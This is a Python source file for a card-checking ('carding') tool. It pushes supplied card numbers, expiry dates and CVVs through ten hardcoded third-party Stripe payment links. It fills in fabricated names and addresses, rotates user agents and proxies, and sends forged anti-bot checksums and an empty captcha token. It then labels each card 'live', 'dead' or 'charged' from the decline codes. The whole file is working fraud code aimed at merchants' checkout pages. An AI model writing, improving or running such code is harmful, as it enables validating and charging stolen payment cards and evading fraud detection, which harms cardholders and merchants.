"""
Stripe Payment Gateway - 10 payment link versions from stripe_payment_mimic.py.
"""

import random
import re
import string
import urllib.parse
import uuid
from typing import Dict, Any, Optional
from datetime import datetime
import httpx


STRIPE_VERSIONS = {
    1: {"payment_link_id": "28E5kDbEv0E59T4beId3i1r", "payment_link_url": "https://buy.stripe.com", "stripe_version": 1},
    2: {"payment_link_id": "28EaEX0ZR72t5CO2Icd3i1z", "payment_link_url": "https://buy.stripe.com", "stripe_version": 2},
    3: {"payment_link_id": "4gM4gz23VeuV0iu1E8d3i1k", "payment_link_url": "https://buy.stripe.com", "stripe_version": 3},
    4: {"payment_link_id": "5kQ9AT5VSbs87O75hY9sk0t", "payment_link_url": "https://buy.stripe.com", "stripe_version": 4},
    5: {"payment_link_id": "00geW51hebE87Kg000", "payment_link_url": "https://buy.stripe.com", "stripe_version": 5},
    6: {"payment_link_id": "28E00kfc07VY63X7n8gYV2A", "payment_link_url": "https://buy.stripe.com", "stripe_version": 6},
    7: {"payment_link_id": "14A7sLbpXgry3Cf5wZaIM04", "payment_link_url": "https://buy.stripe.com", "stripe_version": 7},
    8: {"payment_link_id": "6oU14o6pY8yfbG57yIa7C0x", "payment_link_url": "https://buy.stripe.com", "stripe_version": 8},
    9: {"payment_link_id": "00w00jfTJ81B46G7qQ6oo00", "payment_link_url": "https://buy.stripe.com", "stripe_version": 9},
    10: {"payment_link_id": "dRm8wObuC8pH5m6fFB77O07", "payment_link_url": "https://buy.stripe.com", "stripe_version": 10},
}


class _ClientCtx:
    def __init__(self, proxy=None):
        self._proxy = proxy
    async def __aenter__(self):
        limits = httpx.Limits(max_connections=50, max_keepalive_connections=20)
        self._client = httpx.AsyncClient(timeout=25.0, proxy=self._proxy, follow_redirects=True, limits=limits)
        return self._client
    async def __aexit__(self, *args):
        pass

class StripeGateway:
    name = "stripe"
    display_name = "Stripe"

    supported_cards = ["visa", "mastercard", "amex", "discover", "jcb"]
    supported_currencies = ["USD", "EUR", "GBP", "CAD", "AUD", "INR"]

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    ]

    RANDOM_NAMES = [
        ("John", "Smith"), ("Sarah", "Johnson"), ("Michael", "Williams"),
        ("Emma", "Brown"), ("David", "Jones"), ("Lisa", "Garcia"),
        ("James", "Miller"), ("Anna", "Davis"), ("Robert", "Anderson"), ("Mary", "Taylor"),
    ]

    RANDOM_ADDRESSES = [
        {"line1": "1620 Northwest 23rd Avenue", "city": "Portland", "state": "OR", "postal_code": "97210"},
        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "postal_code": "62701"},
        {"line1": "124 Conch Street", "city": "Bikini Bottom", "state": "CA", "postal_code": "93510"},
        {"line1": "8 Beverly Hills", "city": "Los Angeles", "state": "CA", "postal_code": "90210"},
        {"line1": "10 Downing Street", "city": "London", "state": "NY", "postal_code": "10001"},
    ]

    @staticmethod
    def _rand_id(k=32):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

    @classmethod
    def _get_random_values(cls, card_number: str, exp_month: int, exp_year: int, cvv: str) -> Dict[str, Any]:
        first_name, last_name = random.choice(cls.RANDOM_NAMES)
        address = random.choice(cls.RANDOM_ADDRESSES)
        ua = random.choice(cls.USER_AGENTS)
        phone_number = f"+1{random.randint(2,9)}{random.randint(0,9)}{random.randint(0,9)}{random.randint(2,9)}{random.randint(0,9)}{random.randint(0,9)}{random.randint(1,9)}{random.randint(0,9)}{random.randint(0,9)}{random.randint(0,9)}"

        if card_number.startswith("4"):
            card_type = "visa"
        elif card_number.startswith(("51", "52", "53", "54", "55")):
            card_type = "mastercard"
        elif card_number.startswith(("34", "37")):
            card_type = "amex"
        elif card_number.startswith("6011") or card_number.startswith("65"):
            card_type = "discover"
        elif card_number.startswith("35"):
            card_type = "jcb"
        else:
            card_type = "unknown"

        return {
            "first_name": first_name, "last_name": last_name,
            "full_name": f"{first_name} {last_name}",
            "email": f"{first_name.lower()}.{last_name.lower()}@example.com",
            "address": address, "card_type": card_type,
            "card_number": card_number, "exp_month": exp_month,
            "exp_year": exp_year, "cvc": cvv,
            "phone_number": phone_number, "user_agent": ua,
        }

    @classmethod
    async def process(
        cls,
        card_number: str,
        exp_month: int,
        exp_year: int,
        cvv: str,
        amount: float = 1.0,
        currency: str = "USD",
        stripe_version: int = 1,
        **kwargs
    ) -> Dict[str, Any]:
        proxy = kwargs.get("proxy")
        try:
            if exp_year > 99:
                exp_year = exp_year % 100

            rv = cls._get_random_values(card_number, exp_month, exp_year, cvv)
            card_type = rv["card_type"]

            version_config = STRIPE_VERSIONS.get(stripe_version, STRIPE_VERSIONS[1])
            payment_link_id = version_config["payment_link_id"]
            payment_link_url = version_config["payment_link_url"]
            sv = version_config["stripe_version"]

            buy_url = f"{payment_link_url}/{payment_link_id}"

            async with _ClientCtx(proxy) as client:
            # Step 1: Fetch payment link to get pk_live key
                get_headers = {
                    "accept": "application/json",
                    "sec-ch-ua-platform": "Linux",
                    "accept-language": "en-US,en;q=0.9",
                    "sec-ch-ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": rv["user_agent"],
                    "origin": payment_link_url,
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": f"{payment_link_url}/",
                }
                pl_resp = await client.get(
                    f"https://merchant-ui-api.stripe.com/payment-links/{payment_link_id}",
                    headers=get_headers,
                )

                pk_live = None
                checkout_session_id = None
                config_id = None
                init_checksum = None
                expected_amount = None
                line_item_id = None
                custom_fields = []

                if pl_resp.status_code == 200:
                    try:
                        pl_data = pl_resp.json()
                        pk_live = pl_data.get("pk_live") or pl_data.get("public_key")
                        checkout_session_id = pl_data.get("session_id")
                        config_id = pl_data.get("config_id")
                        init_checksum = pl_data.get("init_checksum")
                        lig = pl_data.get("line_item_group") or {}
                        expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
                        if expected_amount is not None:
                            expected_amount = int(expected_amount)
                        items = lig.get("line_items") or []
                        if items:
                            line_item_id = items[0].get("id")
                        custom_fields = pl_data.get("custom_fields", [])
                        if not custom_fields:
                            for key in ["attributes", "payment_settings", "checkout", "form", "settings"]:
                                if key in pl_data and pl_data[key] is not None:
                                    custom_fields = pl_data[key].get("custom_fields", [])
                                    if custom_fields:
                                        break
                        if not custom_fields:
                            for key, value in pl_data.items():
                                if isinstance(value, dict) and "custom_fields" in value:
                                    custom_fields = value.get("custom_fields", [])
                                    if custom_fields:
                                        break
                    except Exception:
                        pass

                if not custom_fields:
                    try:
                        buy_resp = await client.get(buy_url, headers={
                            "accept": "text/html,application/xhtml+xml",
                            "user-agent": rv["user_agent"],
                        }, timeout=15)
                        if buy_resp.status_code == 200:
                            html = buy_resp.text
                            cf_ids = re.findall(r'cstm_fld_[A-Za-z0-9]+', html)
                            cf_ids = list(dict.fromkeys(cf_ids))
                            if cf_ids:
                                custom_fields = []
                                for cf_id in cf_ids:
                                    custom_fields.append({"id": cf_id, "type": "text"})
                    except Exception:
                        pass

                if not pk_live:
                    pk_live = "pk_live_51JHtoSI7vDXtMzkMWNk2vWkSCTd0CJleFGryfjIIz6CGQLaMEN6CUuo2u0hZUXS0z4SDQS8olGezV8Bfc6NIbmtK00YemvvHe5"

                # Step 1b: Create payment session
                session_data = {}
                try:
                    sess_resp = await client.post(
                        f"https://merchant-ui-api.stripe.com/payment-links/{payment_link_id}",
                        headers={**get_headers, "origin": "https://buy.stripe.com", "referer": f"{payment_link_url}/"},
                        data=urllib.parse.urlencode({"eid": "NA", "browser_locale": "en-US", "browser_timezone": "Asia/Calcutta"}),
                    )
                    if sess_resp.status_code == 200:
                        session_data = sess_resp.json()
                        if not checkout_session_id:
                            checkout_session_id = session_data.get("session_id")
                        if expected_amount is None:
                            lig = session_data.get("line_item_group") or {}
                            expected_amount = lig.get("total") or lig.get("due")
                            if expected_amount is not None:
                                expected_amount = int(expected_amount)
                        if not custom_fields:
                            custom_fields = session_data.get("_extracted_custom_fields") or []
                        if not custom_fields:
                            for key in ["attributes", "payment_settings", "checkout", "form", "settings"]:
                                if key in session_data and session_data[key] is not None:
                                    cf = session_data[key].get("custom_fields", [])
                                    if cf:
                                        custom_fields = cf
                                        session_data["_extracted_custom_fields"] = custom_fields
                                        break
                except Exception:
                    pass

                if not checkout_session_id:
                    return {"status": "error", "success": False, "message": "Could not get session", "gateway": cls.name}

                # Step 2: Get elements session for amount/config
                stripe_js_id = str(uuid.uuid4())
                currency_code = "usd"

                api_headers = {
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": rv["user_agent"],
                }

                elements_params = {
                    "client_betas[0]": "google_pay_beta_1",
                    "deferred_intent[mode]": "payment",
                    "deferred_intent[amount]": str(expected_amount) if expected_amount else "100",
                    "deferred_intent[currency]": currency_code,
                    "deferred_intent[payment_method_types][0]": "card",
                    "deferred_intent[payment_method_types][1]": "link",
                    "deferred_intent[capture_method]": "automatic_async",
                    "currency": currency_code,
                    "key": pk_live,
                    "elements_init_source": "payment_link",
                    "hosted_surface": "checkout",
                    "referrer_host": "buy.stripe.com",
                    "stripe_js_id": stripe_js_id,
                    "locale": "en",
                    "type": "deferred_intent",
                    "checkout_session_id": checkout_session_id,
                }

                es_resp = await client.get("https://api.stripe.com/v1/elements/sessions", params=elements_params, headers=api_headers)
                es_data = es_resp.json()

                if not config_id:
                    config_id = es_data.get("config_id")

                if expected_amount is None:
                    sess = es_data.get("session") or es_data
                    expected_amount = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
                if expected_amount is None and "displayed_line_item_groups" in es_data and es_data["displayed_line_item_groups"]:
                    grp = es_data["displayed_line_item_groups"][0]
                    expected_amount = grp.get("subtotal") or grp.get("total")
                if expected_amount is None:
                    expected_amount = 100
                expected_amount = int(expected_amount)
                expected_amount_str = str(expected_amount)

                if not line_item_id and "displayed_line_item_groups" in es_data and es_data["displayed_line_item_groups"]:
                    items = es_data["displayed_line_item_groups"][0].get("line_items") or []
                    if items:
                        line_item_id = items[0].get("id")

                # Step 3: Create payment method
                guid = str(uuid.uuid4())
                muid = str(uuid.uuid4())
                sid = str(uuid.uuid4())

                buy_headers = {**api_headers, "origin": payment_link_url, "referer": f"{payment_link_url}/"}

                form_pm = {
                    "type": "card",
                    "card[number]": card_number,
                    "card[cvc]": cvv,
                    "card[exp_month]": str(exp_month).zfill(2),
                    "card[exp_year]": str(exp_year).zfill(2),
                    "billing_details[name]": rv["full_name"],
                    "billing_details[email]": rv["email"],
                    "billing_details[address][country]": "US",
                    "billing_details[address][line1]": rv["address"]["line1"],
                    "billing_details[address][city]": rv["address"]["city"],
                    "billing_details[address][postal_code]": rv["address"]["postal_code"],
                    "billing_details[address][state]": rv["address"]["state"],
                    "guid": guid, "muid": muid, "sid": sid,
                    "key": pk_live,
                    "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
                    "client_attribution_metadata[client_session_id]": stripe_js_id,
                    "client_attribution_metadata[checkout_session_id]": checkout_session_id,
                    "client_attribution_metadata[merchant_integration_source]": "checkout",
                    "client_attribution_metadata[merchant_integration_version]": "payment_link",
                    "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                    "client_attribution_metadata[checkout_config_id]": config_id or "",
                }

                pm_resp = await client.post("https://api.stripe.com/v1/payment_methods", headers=buy_headers, data=urllib.parse.urlencode(form_pm))
                pm_data = pm_resp.json()

                if pm_resp.status_code != 200 or not pm_data.get("id"):
                    err = pm_data.get("error", {})
                    return cls._map_error(err, card_type, card_number)

                pm_id = pm_data["id"]
                brand = pm_data.get("card", {}).get("brand", card_type)
                funding = pm_data.get("card", {}).get("funding", "unknown")

                # Step 4: Confirm payment page
                js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
                pxvid = str(uuid.uuid4())
                rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

                confirm_form = {
                    "eid": "NA",
                    "payment_method": pm_id,
                    "expected_amount": expected_amount_str,
                    "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
                    "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
                    "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
                    "last_displayed_line_item_group_details[total_discount_amount]": "0",
                    "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
                    "shipping[address][line1]": rv["address"]["line1"],
                    "shipping[address][city]": rv["address"]["city"],
                    "shipping[address][country]": "US",
                    "shipping[address][postal_code]": rv["address"]["postal_code"],
                    "shipping[address][state]": rv["address"]["state"],
                    "shipping[name]": rv["full_name"],
                    "expected_payment_method_type": "card",
                    "guid": guid, "muid": muid, "sid": sid,
                    "key": pk_live,
                    "version": "148043f9d7",
                    "init_checksum": init_checksum or cls._rand_id(32),
                    "js_checksum": js_checksum,
                    "pxvid": pxvid,
                    "passive_captcha_token": "",
                    "rv_timestamp": rv_timestamp,
                    "client_attribution_metadata[client_session_id]": stripe_js_id,
                    "client_attribution_metadata[checkout_session_id]": checkout_session_id,
                    "client_attribution_metadata[merchant_integration_source]": "checkout",
                    "client_attribution_metadata[merchant_integration_version]": "payment_link",
                    "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                    "client_attribution_metadata[checkout_config_id]": config_id or "",
                    "link_brand": "link",
                }

                if sv not in (4, 6, 7):
                    confirm_form["name_collection[individual_name]"] = rv["first_name"]
                confirm_form["name_collection[source]"] = "payment_form"

                if sv == 8:
                    confirm_form["billing_details[phone]"] = rv["phone_number"]

                # Add custom fields
                if custom_fields:
                    for idx, field in enumerate(custom_fields):
                        field_id = field.get("id")
                        field_type = field.get("type")
                        if not field_id:
                            continue
                        confirm_form[f"custom_fields[{idx}][custom_field_id]"] = field_id
                        if field_type == "dropdown":
                            dropdown_config = field.get("dropdown", {})
                            options = dropdown_config.get("options", []) if isinstance(dropdown_config, dict) else []
                            selected_value = None
                            for option in options:
                                if isinstance(option, dict) and option.get("default"):
                                    selected_value = option.get("value")
                                    break
                            if not selected_value and options:
                                selected_value = options[0].get("value") if isinstance(options[0], dict) else str(options[0])
                            confirm_form[f"custom_fields[{idx}][dropdown]"] = selected_value or "a"
                        elif field_type == "text":
                            confirm_form[f"custom_fields[{idx}][text]"] = rv["full_name"]
                        elif field_type == "numeric":
                            confirm_form[f"custom_fields[{idx}][numeric]"] = "1"
                        else:
                            confirm_form[f"custom_fields[{idx}][text]"] = "default"

                confirm_resp = await client.post(
                    f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
                    headers=buy_headers,
                    data=urllib.parse.urlencode(confirm_form, safe=""),
                )
                data = confirm_resp.json()

                if confirm_resp.status_code == 400 and not custom_fields:
                    error_msg = data.get("error", {}).get("message", "")
                    cf_match = re.search(r'cstm_fld_[A-Za-z0-9]+', error_msg)
                    if cf_match:
                        cf_id = cf_match.group(0)
                        for cf_attempt in [("dropdown", "a"), ("text", rv["full_name"]), ("numeric", "1")]:
                            cf_type, cf_val = cf_attempt
                            confirm_form[f"custom_fields[0][custom_field_id]"] = cf_id
                            confirm_form.pop("custom_fields[0][dropdown]", None)
                            confirm_form.pop("custom_fields[0][text]", None)
                            confirm_form.pop("custom_fields[0][numeric]", None)
                            confirm_form[f"custom_fields[0][{cf_type}]"] = cf_val
                            confirm_resp = await client.post(
                                f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
                                headers=buy_headers,
                                data=urllib.parse.urlencode(confirm_form, safe=""),
                            )
                            data = confirm_resp.json()
                            if confirm_resp.status_code == 200 or "custom field" not in data.get("error", {}).get("message", "").lower():
                                break

                # Step 5: Analyze result
                if confirm_resp.status_code == 200:
                    if isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
                        return {
                            "status": "live", "success": True,
                            "message": f"3DS Required - Card is live ({brand} {funding})",
                            "gateway": cls.name, "card_type": card_type, "card_brand": brand,
                            "funding": funding, "amount": amount, "card_last4": card_number[-4:],
                            "stripe_version": sv, "timestamp": datetime.now().isoformat()
                        }
                    pi = data.get("payment_intent", {})
                    if pi:
                        pi_status = pi.get("status", "")
                        if pi_status == "succeeded":
                            return {"status": "charged", "success": True, "message": f"Payment Charged ({brand})", "payment_id": pi.get("id"), "gateway": cls.name, "card_type": card_type, "card_brand": brand, "amount": amount, "card_last4": card_number[-4:], "stripe_version": sv, "timestamp": datetime.now().isoformat()}
                        elif pi_status == "requires_action":
                            return {"status": "live", "success": True, "message": f"3DS Required - Card Live ({brand})", "payment_id": pi.get("id"), "gateway": cls.name, "card_type": card_type, "card_brand": brand, "card_last4": card_number[-4:], "stripe_version": sv, "timestamp": datetime.now().isoformat()}
                        elif pi_status == "requires_capture":
                            return {"status": "live", "success": True, "message": f"Authorized - Card Live ({brand})", "payment_id": pi.get("id"), "gateway": cls.name, "card_type": card_type, "card_brand": brand, "card_last4": card_number[-4:], "stripe_version": sv, "timestamp": datetime.now().isoformat()}
                    return {"status": "live", "success": True, "message": f"Payment method created ({brand})", "payment_method_id": pm_id, "gateway": cls.name, "card_type": card_type, "card_brand": brand, "card_last4": card_number[-4:], "stripe_version": sv, "timestamp": datetime.now().isoformat()}

                err = data.get("error", {})
                return cls._map_error(err, card_type, card_number, brand, sv)

        except Exception as e:
            return {"status": "error", "success": False, "message": f"Stripe error: {str(e)}", "gateway": cls.name, "timestamp": datetime.now().isoformat()}

    @classmethod
    def _map_error(cls, err: Dict, card_type: str, card_number: str, brand: str = "", sv: int = 1) -> Dict:
        code = err.get("code", "unknown")
        decline_code = err.get("decline_code", "")
        message = err.get("message", "Payment failed")

        if code == "card_declined":
            if decline_code in ("insufficient_funds",):
                status, msg = "live", "Card Live - Insufficient Funds"
            elif decline_code in ("lost_card", "stolen_card"):
                status, msg = "dead", f"Card {decline_code.replace('_', ' ')}"
            elif decline_code in ("expired_card",):
                status, msg = "dead", "Card Expired"
            elif decline_code in ("incorrect_number",):
                status, msg = "dead", "Invalid Card Number"
            elif decline_code == "live_mode_test_card":
                status, msg = "dead", "Test Card on Live Mode"
            else:
                status, msg = "dead", f"Card Declined ({decline_code or code})"
        elif code == "incorrect_cvc":
            status, msg = "ccn", "Incorrect CVV"
        elif code == "expired_card":
            status, msg = "dead", "Card Expired"
        elif code == "incorrect_number":
            status, msg = "dead", "Invalid Card Number"
        else:
            status, msg = "dead", message

        return {
            "status": status, "success": False, "message": msg,
            "error_code": code, "decline_code": decline_code,
            "gateway": "stripe", "card_type": card_type, "card_brand": brand,
            "card_last4": card_number[-4:], "stripe_version": sv,
            "timestamp": datetime.now().isoformat()
        }

    @classmethod
    def _detect_card_type(cls, card_number: str) -> str:
        card_number = card_number.replace(" ", "").replace("-", "")
        if card_number.startswith("4"):
            return "visa"
        elif card_number.startswith(("51", "52", "53", "54", "55")):
            return "mastercard"
        elif card_number.startswith(("34", "37")):
            return "amex"
        elif card_number.startswith("6011") or card_number.startswith("65"):
            return "discover"
        elif card_number.startswith("35"):
            return "jcb"
        return "unknown"

    @classmethod
    async def test_connection(cls) -> Dict:
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.get(f"https://buy.stripe.com/{STRIPE_VERSIONS[1]['payment_link_id']}")
                return {"success": resp.status_code == 200, "gateway": cls.name, "message": "Stripe reachable", "status": "online"}
        except Exception as e:
            return {"success": False, "gateway": cls.name, "message": str(e), "status": "offline"}
